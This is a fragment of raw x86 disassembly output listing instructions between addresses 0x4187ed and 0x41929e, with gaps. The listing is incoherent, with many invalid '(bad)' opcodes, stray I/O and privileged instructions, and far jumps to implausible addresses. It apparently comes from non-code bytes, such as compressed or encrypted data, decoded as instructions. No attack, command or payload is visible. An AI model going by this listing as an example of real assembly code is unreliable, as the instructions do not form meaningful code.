  4187ed:	cmp    al,0x1d
  4187ef:	xor    BYTE PTR [ebp+0x2cf46f9e],dh
  4187f5:	test   BYTE PTR [ebp+0x2b],ah
  4187f8:	rcl    DWORD PTR [edx+0x7343ebaa],0xe4
  4187ff:	fisttp QWORD PTR [edx-0x5812203f]
  418805:	inc    ebp
  418806:	xor    BYTE PTR [edi],bh
  418808:	sbb    al,0xf9
  41880a:	mov    ds:0xea047ddd,eax
  41880f:	add    esp,edi
  418811:	pop    ecx
  418812:	mov    WORD PTR [ebx-0x33ac4521],fs
  418818:	scas   eax,DWORD PTR es:[edi]
  418819:	lahf   
  41881a:	inc    ecx
  41881b:	inc    ebp
  41881c:	ins    DWORD PTR es:[edi],dx
  41881d:	mov    BYTE PTR [esi+0x4cd2aa38],bl
  418823:	cs or  eax,0xfb2c5f1c
  418829:	or     dh,dl
  41882b:	lds    ebp,FWORD PTR [esi-0x5b]
  41882e:	inc    edi
  41882f:	mov    ah,0x37
  418831:	dec    ebx
  418832:	aas    
  418833:	mov    al,BYTE PTR [ecx+eax*4-0xbff49c7]
  41883a:	ret    0x9fe8
  41883d:	lods   eax,DWORD PTR ds:[esi]
  41883e:	push   edx
  41883f:	xchg   ebx,eax
  418840:	fadd   QWORD PTR [eax]
	...
  4188b2:	add    BYTE PTR [eax],al
  4188b4:	pop    eax
  4188b5:	inc    ecx
  4188b6:	pop    ds
  4188b7:	lods   eax,DWORD PTR ds:[esi]
  4188b8:	pop    ds
  4188b9:	(bad)  
  4188ba:	cli    
  4188bb:	cmc    
  4188bc:	inc    ebx
  4188bd:	mov    ss:0xbd320a32,al
  4188c3:	dec    ecx
  4188c4:	fisttp WORD PTR [edx]
  4188c6:	add    DWORD PTR [eax],eax
  4188c8:	cmc    
  4188c9:	add    BYTE PTR [eax],al
  4188cb:	add    BYTE PTR [eax+0x11c8a182],dh
  4188d1:	pop    ecx
  4188d2:	mov    dl,ch
  4188d4:	test   al,0x37
  4188d6:	cmp    eax,0x6ebdd696
  4188db:	push   ebx
  4188dc:	cld    
  4188dd:	cmp    dh,dh
  4188df:	push   ebx
  4188e0:	daa    
  4188e1:	and    esi,DWORD PTR [edx-0x19c262ad]
  4188e7:	or     DWORD PTR [ebp+0xa36bfc8],edx
  4188ed:	sbb    eax,0xffdb958c
  4188f2:	pop    ebp
  4188f3:	mov    al,0x4d
  4188f5:	dec    edx
  4188f6:	dec    esp
  4188f7:	push   0x56
  4188f9:	mov    ds:0x6b3c1a27,eax
  4188fe:	stos   BYTE PTR es:[edi],al
  4188ff:	jp     0x418941
  418901:	mov    ecx,0x2ed7483f
  418906:	in     eax,dx
  418907:	sub    DWORD PTR [edx],esi
  418909:	jo     0x4188fc
  41890b:	addr16 xchg esi,eax
  41890d:	mov    al,ds:0x618aad43
  418912:	inc    eax
  418913:	push   0x71
  418915:	fbld   TBYTE PTR [ebx-0x69c491a1]
  41891b:	int3   
  41891c:	aam    0x6d
  41891e:	push   cs
  41891f:	pop    ax
  418921:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418922:	xor    eax,0x16b4d996
  418927:	imul   edx,DWORD PTR [eax+0x44],0x7d1e9a98
  41892e:	sub    WORD PTR [esi-0x26a6a71b],ax
  418935:	xor    al,0x82
  418937:	stos   BYTE PTR es:[edi],al
  418938:	(bad)  
  418939:	nop
  41893a:	push   0x39e44112
  41893f:	sbb    ecx,0xffffffd7
  418942:	sub    ebp,DWORD PTR [esi-0x34]
  418945:	daa    
  418946:	jge    0x418950
  418948:	arpl   WORD PTR [ebx-0x4f493c1b],ax
  41894e:	cld    
  41894f:	out    dx,eax
  418950:	cs mov eax,0xd0547317
  418956:	icebp  
  418957:	xchg   ebp,eax
  418958:	jnp    0x4189b9
  41895a:	aad    0x83
  41895c:	xchg   esp,eax
  41895d:	cmp    cl,0xe5
  418960:	fidiv  WORD PTR [esi+0x66]
  418963:	mov    eax,ds:0xa09355a4
  418968:	pop    edx
  418969:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41896a:	mov    ds:0x407b3ae3,ax
  418970:	dec    eax
  418971:	mov    cl,0x2d
  418973:	gs adc DWORD PTR es:[ebx-0x37],0x342c6389
  41897c:	test   DWORD PTR [ebp-0x635a9d5e],ebx
  418982:	add    bl,BYTE PTR [ebp-0x5a0a3692]
  418988:	add    al,0xee
  41898a:	cdq    
  41898b:	dec    esi
  41898c:	cmp    eax,0x8bc10bcc
  418991:	mov    ah,0x65
  418993:	sub    DWORD PTR [ecx-0x6dc64287],eax
  418999:	gs ret 0x96e3
  41899d:	in     eax,dx
  41899e:	xchg   ebx,eax
  41899f:	adc    DWORD PTR [esp+ecx*2],0xf168e2c0
  4189a6:	mov    ecx,0xfbcd3c9e
  4189ab:	jg     0x418963
  4189ad:	add    al,0x22
  4189af:	jge    0x4189ce
  4189b1:	sbb    eax,0xa32088fa
  4189b6:	cmc    
  4189b7:	inc    esi
  4189b8:	xchg   ebp,eax
  4189b9:	xor    eax,0x7ee8257b
  4189be:	retf   
  4189bf:	add    cl,BYTE PTR [eax+0x0]
	...
  418a31:	add    BYTE PTR [eax],al
  418a33:	add    BYTE PTR [edi],ch
  418a35:	stos   DWORD PTR es:[edi],eax
  418a36:	cdq    
  418a37:	inc    ecx
  418a38:	popf   
  418a39:	jae    0x418a3a
  418a3b:	out    dx,eax
  418a3c:	inc    esp
  418a3d:	dec    edi
  418a3e:	(bad)  
  418a3f:	clc    
  418a40:	xchg   ebp,eax
  418a41:	fdivr  DWORD PTR [esi-0x66]
  418a44:	aam    0xb
  418a46:	add    DWORD PTR [eax],eax
  418a48:	cmc    
  418a49:	add    BYTE PTR [eax],al
  418a4b:	add    ah,dh
  418a4d:	mov    eax,0xd37e43c4
  418a52:	inc    esi
  418a53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a54:	inc    edi
  418a55:	fs icebp 
  418a57:	push   0xb3ce95d7
  418a5c:	hlt    
  418a5d:	push   0x4e72e1aa
  418a62:	imul   eax,DWORD PTR [ebp-0x798aeb4f],0x1b
  418a69:	and    eax,0xf45a9089
  418a6e:	lds    esi,FWORD PTR [edx-0x5b7974ea]
  418a74:	fsubr  st(7),st
  418a76:	shl    edx,cl
  418a78:	js     0x418aed
  418a7a:	repz push esp
  418a7c:	imul   edi,ecx,0xdee8b23a
  418a82:	mov    BYTE PTR [esi-0x2c],al
  418a85:	pop    ds
  418a86:	mov    ebp,0xed877d
  418a8b:	cmc    
  418a8c:	inc    ecx
  418a8d:	dec    ecx
  418a8e:	popa   
  418a8f:	sbb    dh,BYTE PTR [ecx+0x37]
  418a92:	ja     0x418a21
  418a94:	bound  ecx,QWORD PTR [ebp-0x5cf1813b]
  418a9a:	(bad)  
  418a9b:	aam    0x2d
  418a9d:	in     eax,0x19
  418a9f:	fimul  WORD PTR [edi]
  418aa1:	iret   
  418aa2:	jg     0x418a4e
  418aa4:	add    cl,BYTE PTR ds:0x360f0231
  418aaa:	dec    esi
  418aab:	jmp    0x2e8c:0xb217b32b
  418ab2:	test   al,0x7
  418ab4:	sbb    eax,DWORD PTR [edx-0x2c]
  418ab7:	in     al,0xfe
  418ab9:	jmp    0x418a69
  418abb:	(bad)  
  418abc:	aas    
  418abd:	cdq    
  418abe:	pop    edi
  418abf:	xchg   esp,eax
  418ac0:	ins    BYTE PTR es:[edi],dx
  418ac1:	inc    edx
  418ac2:	sbb    bh,BYTE PTR [eax+ebp*4+0x1f1618e]
  418ac9:	rcr    ecx,0x32
  418acc:	in     eax,dx
  418acd:	adc    BYTE PTR [ebx],0x8b
  418ad0:	xor    eax,0x4a2a3c6b
  418ad5:	js     0x418ab1
  418ad7:	call   0x97e4:0x57ab5dd0
  418ade:	pop    eax
  418adf:	xchg   esi,eax
  418ae0:	data16 loope 0x418aba
  418ae3:	popa   
  418ae4:	or     al,cl
  418ae6:	and    eax,0x8b4ea585
  418aeb:	pop    ss
  418aec:	(bad)  
  418aed:	sbb    eax,0xc005c560
  418af2:	fild   DWORD PTR [ebx+0xd6717ba]
  418af8:	imul   ebx,eax,0x855b3662
  418afe:	sbb    eax,0x2a19135c
  418b03:	or     DWORD PTR [ebp-0x30de18f8],esi
  418b09:	ret    0x4794
  418b0c:	clc    
  418b0d:	mov    WORD PTR [esi],ss
  418b0f:	int3   
  418b10:	inc    ebx
  418b11:	mov    dh,0x15
  418b13:	inc    edi
  418b14:	stos   BYTE PTR es:[edi],al
  418b15:	leave  
  418b16:	add    al,0x58
  418b18:	lds    esi,FWORD PTR [esi]
  418b1a:	mov    al,ds:0xa5e54c2
  418b1f:	(bad)  
  418b20:	mov    bl,0x45
  418b22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b23:	jmp    0x418ae9
  418b25:	dec    ebp
  418b26:	sub    BYTE PTR [edi-0x25ea6f3c],al
  418b2c:	cld    
  418b2d:	repz js 0x418b30
  418b30:	fnsave [edx+0x7b]
  418b33:	mov    dh,0x3a
  418b35:	cmp    al,0x9e
  418b37:	and    BYTE PTR [edi],0xd8
  418b3a:	leave  
  418b3b:	cli    
  418b3c:	jge    0x418b38
  418b3e:	into   
  418b3f:	push   ss
  418b40:	cmp    BYTE PTR [eax],al
	...
  418bb2:	add    BYTE PTR [eax],al
  418bb4:	mov    eax,eax
  418bb6:	nop
  418bb7:	test   cl,bl
  418bb9:	aam    0x9d
  418bbb:	int    0x19
  418bbd:	xchg   edx,eax
  418bbe:	clc    
  418bbf:	(bad)  
  418bc0:	bound  esi,QWORD PTR [esi+0xcc91d5b]
  418bc6:	add    DWORD PTR [eax],eax
  418bc8:	cmc    
  418bc9:	add    BYTE PTR [eax],al
  418bcb:	add    ch,dh
  418bcd:	lea    ecx,[ecx+edx*8+0xaf9f457]
  418bd4:	inc    DWORD PTR [edi-0x67dc36e5]
  418bda:	xchg   esp,eax
  418bdb:	outs   dx,DWORD PTR ds:[esi]
  418bdc:	or     DWORD PTR [edi+eiz*4-0x614365a5],esp
  418be3:	add    al,0x77
  418be5:	enter  0x5144,0xf8
  418be9:	(bad)  
  418bea:	out    dx,al
  418beb:	les    ecx,FWORD PTR [eax-0x69]
  418bee:	(bad)  
  418bef:	in     eax,0xf9
  418bf1:	(bad)  
  418bf2:	and    al,0xf4
  418bf4:	mov    eax,0x5dba8ce6
  418bf9:	mov    dl,0x45
  418bfb:	shl    DWORD PTR [esi-0x4b],1
  418bfe:	add    eax,0xd01c27b0
  418c03:	mov    esi,0x9ae97fe4
  418c08:	das    
  418c09:	push   ecx
  418c0a:	pop    edx
  418c0b:	and    al,0x20
  418c0d:	(bad)  
  418c0e:	push   esp
  418c0f:	push   esp
  418c10:	adc    eax,0x155758c9
  418c15:	ret    
  418c16:	sbb    bl,dh
  418c18:	jno    0x418c60
  418c1a:	add    eax,DWORD PTR [ecx+0x60b677d3]
  418c20:	xchg   esi,eax
  418c21:	mov    ch,0x73
  418c23:	xchg   esi,eax
  418c24:	test   eax,0x6825479c
  418c29:	ret    0xd66d
  418c2c:	sbb    ecx,DWORD PTR [ebp+0x1c]
  418c2f:	inc    eax
  418c30:	mov    bh,0x13
  418c32:	int    0x6a
  418c34:	aaa    
  418c35:	or     bh,BYTE PTR [edi]
  418c37:	jmp    0xfce42bc5
  418c3c:	neg    BYTE PTR [edi+0x18]
  418c3f:	int    0x5
  418c41:	inc    esi
  418c42:	aas    
  418c43:	lods   eax,DWORD PTR ds:[esi]
  418c44:	jp     0x418c26
  418c46:	push   eax
  418c47:	jge    0x418c6b
  418c49:	jg     0x418c8a
  418c4b:	mov    fs,WORD PTR [ecx+0x46]
  418c4e:	ds out dx,eax
  418c50:	(bad)  [esi]
  418c52:	pop    ebp
  418c53:	(bad)  
  418c54:	and    eax,0x6ce7f492
  418c59:	add    eax,0xf2072a0f
  418c5e:	out    dx,al
  418c5f:	out    0x7b,al
  418c61:	and    cl,cl
  418c63:	outs   dx,DWORD PTR ds:[esi]
  418c64:	mov    ebp,0x7af9e8fe
  418c69:	in     al,dx
  418c6a:	out    dx,al
  418c6b:	(bad)  
  418c6c:	fist   WORD PTR [esi]
  418c6e:	mov    esp,0x7eed1c31
  418c73:	push   ebx
  418c74:	in     al,dx
  418c75:	dec    esi
  418c76:	dec    edx
  418c77:	repnz fisttp DWORD PTR [edx+0x7b]
  418c7b:	add    eax,DWORD PTR [eax+0x57c202c7]
  418c81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c82:	lds    ebp,FWORD PTR [ecx]
  418c84:	out    dx,al
  418c85:	je     0x418c5e
  418c87:	mov    esp,0x978edd35
  418c8c:	imul   edi,eax,0x2b
  418c8f:	cmc    
  418c90:	xor    eax,0x2e80ef4b
  418c95:	and    eax,0xbf06528c
  418c9a:	adc    eax,0x38527271
  418c9f:	(bad)  
  418ca0:	cli    
  418ca1:	ins    BYTE PTR es:[edi],dx
  418ca2:	pop    es
  418ca3:	and    BYTE PTR [edi-0xaf451ab],bl
  418ca9:	ret    
  418caa:	pop    ecx
  418cab:	dec    esp
  418cac:	adc    al,0xa3
  418cae:	sar    DWORD PTR [edi],cl
  418cb0:	les    edx,FWORD PTR [edi+0x71]
  418cb3:	rol    DWORD PTR [edx-0x372e517d],cl
  418cb9:	lods   al,BYTE PTR ds:[esi]
  418cba:	inc    eax
  418cbb:	push   eax
  418cbc:	xor    edx,DWORD PTR [eax+0x7a]
  418cbf:	mov    edx,0x7a
	...
  418d34:	pop    ss
  418d35:	arpl   WORD PTR ds:0x5f7f7d53,bx
  418d3b:	addr16 in eax,dx
  418d3d:	inc    eax
  418d3e:	jmp    0xf11bec61
  418d43:	jne    0x418d03
  418d45:	or     eax,0xf50001
  418d4a:	add    BYTE PTR [eax],al
  418d4c:	jle    0x418dc6
  418d4e:	into   
  418d4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d50:	and    BYTE PTR [ebx+ecx*8+0x6f7e38c],bh
  418d57:	repz pushf 
  418d59:	xlat   BYTE PTR ds:[ebx]
  418d5a:	inc    esi
  418d5b:	sbb    ch,BYTE PTR ds:0xcce84a6e
  418d61:	sbb    BYTE PTR [ebx+eax*2+0x261be538],0x66
  418d69:	and    DWORD PTR ds:0xb1a39a95,edi
  418d6f:	pushf  
  418d70:	scas   eax,DWORD PTR es:[edi]
  418d71:	outs   dx,DWORD PTR ds:[esi]
  418d72:	ret    0xda3
  418d75:	pop    es
  418d76:	sti    
  418d77:	fs and al,0xf
  418d7a:	lds    ebp,FWORD PTR [ecx+ebx*4-0x4]
  418d7e:	sub    al,0x7c
  418d80:	push   ds
  418d81:	lods   eax,DWORD PTR ds:[esi]
  418d82:	or     dh,BYTE PTR [eax+0x73]
  418d85:	aam    0xd0
  418d87:	call   0xd347:0xc1732681
  418d8e:	jne    0x418d31
  418d90:	add    DWORD PTR [ecx],eax
  418d92:	lods   eax,DWORD PTR ds:[esi]
  418d93:	in     eax,0x29
  418d95:	pushf  
  418d96:	popf   
  418d97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d98:	cld    
  418d99:	es loop 0x418d22
  418d9c:	mov    esi,0xe68c0c86
  418da1:	sub    ebp,DWORD PTR [eax-0x72]
  418da4:	cmp    dl,BYTE PTR [edx-0x80]
  418da7:	jle    0x418dc0
  418da9:	(bad)  
  418dab:	dec    ebp
  418dac:	sub    eax,0x3ceb158
  418db1:	and    al,0xb
  418db3:	mov    ds:0xc2eeb4a6,eax
  418db8:	fwait
  418db9:	shr    BYTE PTR [eax-0x2c],1
  418dbc:	iret   
  418dbd:	jae    0x418e06
  418dbf:	loope  0x418e02
  418dc1:	les    edi,FWORD PTR [edx+ebp*2+0x5e842adc]
  418dc8:	aad    0xaa
  418dca:	xlat   BYTE PTR ds:[ebx]
  418dcb:	out    dx,eax
  418dcc:	repz dec ebp
  418dce:	nop
  418dcf:	xor    BYTE PTR [eax],0xf7
  418dd2:	add    cl,bl
  418dd4:	add    al,0x8d
  418dd6:	pop    ss
  418dd7:	jecxz  0x418e34
  418dd9:	(bad)  
  418dda:	dec    edi
  418ddb:	jp     0x418d82
  418ddd:	add    eax,0xfe624e4a
  418de2:	(bad)  
  418de3:	(bad)  
  418de4:	push   ebp
  418de5:	xchg   esp,eax
  418de6:	jno    0x418de5
  418de8:	hlt    
  418de9:	mov    ebx,ebp
  418deb:	or     al,0xff
  418ded:	sti    
  418dee:	mov    ss,WORD PTR ds:0x88d36d47
  418df4:	jo     0x418e6f
  418df6:	push   0x4b
  418df8:	outs   dx,DWORD PTR ds:[esi]
  418df9:	sub    DWORD PTR ds:[edx-0x3705b72f],edx
  418e00:	mov    edx,0x51f5d73a
  418e06:	xlat   BYTE PTR ds:[ebx]
  418e07:	mov    esp,0x5b2ee398
  418e0c:	xchg   edi,eax
  418e0d:	jb     0x418dee
  418e0f:	jns    0x418df5
  418e11:	mov    eax,0x485a1c82
  418e16:	adc    al,0x91
  418e18:	mov    cl,0xad
  418e1a:	inc    esp
  418e1b:	repz add eax,0xf0da774a
  418e21:	xchg   edi,eax
  418e22:	sub    DWORD PTR [edx],0xc6bdf306
  418e28:	mov    cl,0x37
  418e2a:	push   es
  418e2b:	or     eax,0xe026fadf
  418e30:	sbb    BYTE PTR ds:[edi-0x460f2121],ch
  418e37:	and    eax,0xb54f02d6
  418e3c:	(bad)  
  418e3d:	cmp    bl,BYTE PTR [esi+0x53]
  418e40:	aas    
	...
  418eb1:	add    BYTE PTR [eax],al
  418eb3:	add    BYTE PTR [edx-0x1a],ah
  418eb6:	out    0x3b,al
  418eb8:	out    0x3b,al
  418eba:	(bad)  
  418ebb:	push   DWORD PTR [eax-0x20]
  418ebe:	jecxz  0x418eb9
  418ec0:	push   ebx
  418ec1:	inc    edi
  418ec2:	fdivr  QWORD PTR [edx]
  418ec4:	mov    bl,0xe
  418ec6:	add    DWORD PTR [eax],eax
  418ec8:	cmc    
  418ec9:	add    BYTE PTR [eax],al
  418ecb:	add    BYTE PTR [edx+0x33e0b0bd],al
  418ed1:	push   0x53
  418ed3:	xchg   DWORD PTR [eax+0xd],ebx
  418ed6:	add    bh,bl
  418ed8:	out    0xb,al
  418eda:	and    ebx,DWORD PTR [edx]
  418edc:	adc    bl,BYTE PTR [ebx-0xa]
  418edf:	in     al,0xa9
  418ee1:	dec    esi
  418ee2:	sbb    dl,dl
  418ee4:	cld    
  418ee5:	dec    edi
  418ee6:	fcomip st,st(3)
  418ee8:	pop    eax
  418ee9:	mov    DWORD PTR [edx],edi
  418eeb:	in     al,0x31
  418eed:	xor    eax,0x8025bae4
  418ef2:	cld    
  418ef3:	xor    BYTE PTR [ecx],ch
  418ef5:	mov    bh,0x78
  418ef7:	xor    eax,0xc1eecfec
  418efc:	mov    esp,0x3a451ed0
  418f01:	pop    ds
  418f02:	(bad)  
  418f03:	push   esp
  418f04:	mov    ebx,0xaf62c93
  418f09:	(bad)  
  418f0a:	and    DWORD PTR [edx-0x1c],edi
  418f0d:	je     0x418f8a
  418f0f:	test   DWORD PTR es:[edi+0x9],eax
  418f13:	scas   eax,DWORD PTR es:[edi]
  418f14:	and    edi,DWORD PTR [edi+0x78d10af6]
  418f1a:	out    0x1b,al
  418f1c:	sahf   
  418f1d:	mov    eax,ds:0x9dcb30f4
  418f22:	xchg   edx,eax
  418f23:	test   eax,0xce920b55
  418f28:	pop    ds
  418f29:	lahf   
  418f2a:	push   cs
  418f2b:	inc    ebx
  418f2c:	push   eax
  418f2d:	cmp    eax,DWORD PTR [ecx-0x5fe62bf7]
  418f33:	in     eax,0x29
  418f35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418f36:	shl    DWORD PTR [edx],cl
  418f38:	push   0x89e7afc7
  418f3d:	mov    ah,BYTE PTR [ebx+ecx*1]
  418f40:	repz ja 0x418f1a
  418f43:	les    eax,FWORD PTR [ebp+0x68]
  418f46:	and    edi,DWORD PTR [ebx-0x1b67f16]
  418f4c:	in     eax,dx
  418f4d:	stc    
  418f4e:	xchg   edi,eax
  418f4f:	pop    edi
  418f50:	stos   BYTE PTR es:[edi],al
  418f51:	dec    ecx
  418f52:	xchg   ebp,eax
  418f53:	push   esi
  418f54:	add    esi,edi
  418f56:	and    eax,edx
  418f58:	aaa    
  418f59:	sbb    BYTE PTR [ebp+0x4],0xf
  418f5d:	inc    eax
  418f5e:	xchg   ebp,eax
  418f5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f60:	inc    edx
  418f61:	mov    bl,0x7
  418f63:	push   eax
  418f64:	fbld   TBYTE PTR [eax]
  418f66:	pop    ebx
  418f67:	mov    bl,0x92
  418f69:	and    eax,0x7060bee3
  418f6e:	test   al,0x5d
  418f70:	push   cs
  418f71:	xchg   edx,eax
  418f72:	sahf   
  418f73:	mov    edi,esp
  418f75:	sti    
  418f76:	js     0x418f42
  418f78:	shr    BYTE PTR [edx],1
  418f7a:	jb     0x418fac
  418f7c:	aam    0xab
  418f7e:	loope  0x418fe2
  418f80:	jp     0x418f32
  418f82:	(bad)  
  418f83:	mov    ebx,0x838691e9
  418f88:	or     bl,BYTE PTR [ecx]
  418f8a:	call   0x45c7:0xc2c2f2b3
  418f91:	cmc    
  418f92:	mov    al,ds:0x21f4c555
  418f97:	jbe    0x418f73
  418f99:	add    ebp,DWORD PTR [ebx-0xe]
  418f9c:	jne    0x418f8e
  418f9e:	shl    BYTE PTR [ebx-0x7a],1
  418fa1:	push   edx
  418fa2:	cmc    
  418fa3:	xor    ah,BYTE PTR [ecx-0x60]
  418fa6:	iret   
  418fa7:	push   0xffffffcd
  418fa9:	dec    edi
  418faa:	imul   edi,DWORD PTR [ebp+0x5],0xb24ecba1
  418fb1:	sar    cl,0xc7
  418fb4:	pushf  
  418fb5:	push   0x68e1b9d4
  418fba:	sbb    al,0x52
  418fbc:	jno    0x418fa1
  418fbe:	mov    bl,0xc7
  418fc0:	xor    al,BYTE PTR [eax]
	...
  419032:	add    BYTE PTR [eax],al
  419034:	test   eax,0xff456b7e
  419039:	push   ebp
  41903a:	scas   eax,DWORD PTR es:[edi]
  41903b:	(bad)  
  41903c:	out    dx,eax
  41903d:	mov    ch,0xb6
  41903f:	sar    BYTE PTR [edi-0x57884f30],cl
  419045:	sgdtd  [eax]
  419048:	cmc    
  419049:	add    BYTE PTR [eax],al
  41904b:	add    BYTE PTR [edi+eax*1],bl
  41904e:	mov    esi,0x4cac5a14
  419053:	sub    DWORD PTR [edi+0x39],edx
  419056:	xor    bl,BYTE PTR [esi-0x4c7f2490]
  41905c:	div    esi
  41905e:	aas    
  41905f:	sbb    dh,dl
  419061:	rcl    al,cl
  419063:	sbb    BYTE PTR [edx-0x3026de86],ah
  419069:	jmp    DWORD PTR es:[ecx+0x53645a1e]
  419070:	pop    eax
  419071:	ret    0xe2ff
  419074:	sub    al,0x80
  419076:	fisttp QWORD PTR [ebp+edx*4+0x7e]
  41907a:	push   ebp
  41907c:	outs   dx,BYTE PTR ds:[esi]
  41907d:	xor    ch,BYTE PTR [ebp+0x1dd18e15]
  419083:	jecxz  0x419025
  419085:	dec    eax
  419086:	adc    bh,BYTE PTR [ebx-0x70]
  419089:	jmp    0xde4c7f4
  41908e:	sti    
  41908f:	jle    0x4190f6
  419091:	ret    0x12b9
  419094:	popa   
  419095:	add    edx,DWORD PTR [ecx]
  419097:	lds    ecx,FWORD PTR [ebx]
  419099:	jne    0x41904b
  41909b:	test   BYTE PTR [ecx],ch
  41909d:	push   ss
  41909e:	and    eax,DWORD PTR [edx-0x7f]
  4190a1:	iret   
  4190a2:	xchg   ecx,eax
  4190a3:	out    0xc5,eax
  4190a5:	pop    esi
  4190a6:	sub    esp,DWORD PTR [ecx-0x45648dae]
  4190ac:	sbb    BYTE PTR [edx-0x35],0xdf
  4190b0:	stc    
  4190b1:	cmp    ebp,DWORD PTR [ebp-0x2975ddba]
  4190b7:	out    0x21,eax
  4190b9:	test   DWORD PTR [edi+0x326057b7],eax
  4190bf:	xchg   ecx,eax
  4190c0:	push   edx
  4190c1:	out    dx,al
  4190c2:	inc    edx
  4190c3:	test   eax,0x500f1a22
  4190c8:	dec    ebp
  4190c9:	xchg   edx,eax
  4190ca:	scas   al,BYTE PTR es:[edi]
  4190cb:	or     al,0x61
  4190cd:	sar    BYTE PTR [eax+0x3144443a],0xfa
  4190d4:	inc    ebx
  4190d5:	call   FWORD PTR [ecx]
  4190d7:	mov    ebp,0x904b5251
  4190dc:	sub    al,BYTE PTR [esi+0x65cdc8b5]
  4190e2:	and    eax,0xdd018c10
  4190e7:	lahf   
  4190e8:	xlat   BYTE PTR ds:[ebx]
  4190e9:	cs daa 
  4190eb:	lods   eax,DWORD PTR ds:[esi]
  4190ec:	std    
  4190ed:	push   ds
  4190ee:	sub    al,0x6a
  4190f0:	cwde   
  4190f1:	pop    esp
  4190f2:	jno    0x4190bd
  4190f4:	mov    ecx,0x1d8d6f0d
  4190f9:	inc    edi
  4190fa:	push   cs
  4190fb:	test   BYTE PTR [edi-0x20],dh
  4190fe:	cdq    
  4190ff:	ficomp WORD PTR [esi]
  419101:	pop    edi
  419102:	and    cl,ch
  419104:	adc    ch,bh
  419106:	sbb    al,0x3a
  419108:	add    BYTE PTR [ebx+0x6f],ch
  41910b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41910c:	fistp  WORD PTR ds:0xaad466b0
  419112:	(bad)  
  419114:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419115:	fwait
  419116:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419117:	fdivr  DWORD PTR [ebp+0x7b]
  41911a:	in     al,0xe1
  41911c:	les    ecx,FWORD PTR [edi-0x72]
  41911f:	iret   
  419120:	cli    
  419121:	add    edx,DWORD PTR [edi]
  419123:	mov    ds:0x3439ab78,al
  419128:	fcomip st,st(4)
  41912a:	jmp    0x6b41:0xbdade17e
  419131:	addr16 mov esp,0x6717f360
  419137:	jl     0x419188
  419139:	retf   0xcdd4
  41913c:	sub    DWORD PTR ds:[edx+esi*1-0x4b],ebp
	...
  4191b1:	add    BYTE PTR [eax],al
  4191b3:	add    BYTE PTR [edi],dh
  4191b5:	xchg   edx,eax
  4191b6:	and    al,0x83
  4191b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4191b9:	mov    bh,0xb7
  4191bb:	mov    dh,0xb3
  4191bd:	cmp    al,0x9b
  4191bf:	scas   eax,DWORD PTR es:[edi]
  4191c0:	inc    edx
  4191c1:	mov    esi,0x109d7d15
  4191c6:	add    DWORD PTR [eax],eax
  4191c8:	cmc    
  4191c9:	add    BYTE PTR [eax],al
  4191cb:	add    BYTE PTR [esi+0x3d],cl
  4191ce:	mov    ebp,0x917a0ed9
  4191d3:	or     eax,0x90174d1e
  4191d8:	add    eax,0x8931df67
  4191dd:	pop    ebp
  4191de:	dec    ecx
  4191df:	into   
  4191e0:	(bad)  
  4191e1:	pop    eax
  4191e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4191e3:	ret    0x4f27
  4191e6:	sub    BYTE PTR [edi],0xc8
  4191e9:	aad    0x5f
  4191eb:	mov    ds:0x6f5841a1,al
  4191f0:	out    0x7c,eax
  4191f2:	push   eax
  4191f3:	(bad)  
  4191f5:	push   es
  4191f6:	xor    DWORD PTR [edi],edi
  4191f8:	aaa    
  4191f9:	neg    BYTE PTR [ebp+0x3dc30ca6]
  4191ff:	xchg   cl,dl
  419201:	mov    esp,ebx
  419203:	jnp    0x419276
  419205:	cmp    BYTE PTR [ebx+0x5a3429fc],dh
  41920b:	xchg   esp,eax
  41920c:	pop    edi
  41920d:	aas    
  41920e:	call   0x84c95c3c
  419213:	out    0x9f,al
  419215:	arpl   WORD PTR [ebx+0x5d],bx
  419218:	lea    esp,[edi-0x555dfc25]
  41921e:	call   0x138c:0xda202835
  419225:	adc    dl,BYTE PTR [edx]
  419227:	mov    ebp,0x90215af3
  41922c:	inc    esp
  41922d:	and    ch,BYTE PTR [eax]
  41922f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419230:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419231:	adc    BYTE PTR [edx],ah
  419233:	sbb    esi,esi
  419235:	xchg   esi,eax
  419236:	sub    DWORD PTR [edi-0x35b0b1e],0x6abc6c32
  419240:	xor    BYTE PTR [ebp-0x5a],0xf5
  419244:	adc    cl,BYTE PTR [esi]
  419246:	mov    eax,ds:0xdd1c068f
  41924b:	sub    bh,BYTE PTR [esi-0x5af64b4b]
  419251:	inc    edi
  419252:	lods   eax,DWORD PTR ds:[esi]
  419253:	mov    al,0xbe
  419255:	adc    BYTE PTR [eax-0x469d33c5],dl
  41925b:	and    ch,cl
  41925d:	ret    0x9476
  419260:	push   ss
  419261:	cwde   
  419262:	in     eax,dx
  419263:	xor    edx,DWORD PTR [eax-0x6b]
  419266:	jg     0x419241
  419268:	fld    TBYTE PTR [ebx]
  41926a:	pop    ds
  41926b:	call   0x1f83:0x22354bca
  419272:	loop   0x419202
  419274:	aas    
  419275:	cdq    
  419276:	cwde   
  419277:	push   eax
  419278:	push   ebx
  419279:	sub    BYTE PTR [edi-0x29],0xa5
  41927d:	clc    
  41927e:	adc    eax,0x1f37cae9
  419283:	xchg   ecx,eax
  419284:	pop    esp
  419285:	push   ebp
  419286:	aas    
  419287:	sbb    ecx,ebx
  419289:	jnp    0x419297
  41928b:	jns    0x419213
  41928d:	out    0xa5,eax
  41928f:	mov    ebx,0x543cdd24
  419294:	xchg   edx,eax
  419295:	jmp    0x419229
  419297:	sti    
  419298:	retf   
  419299:	dec    eax
  41929a:	mov    dl,0xb
  41929c:	jmp    0x4192e1
  41929e:	xchg   esi,eax
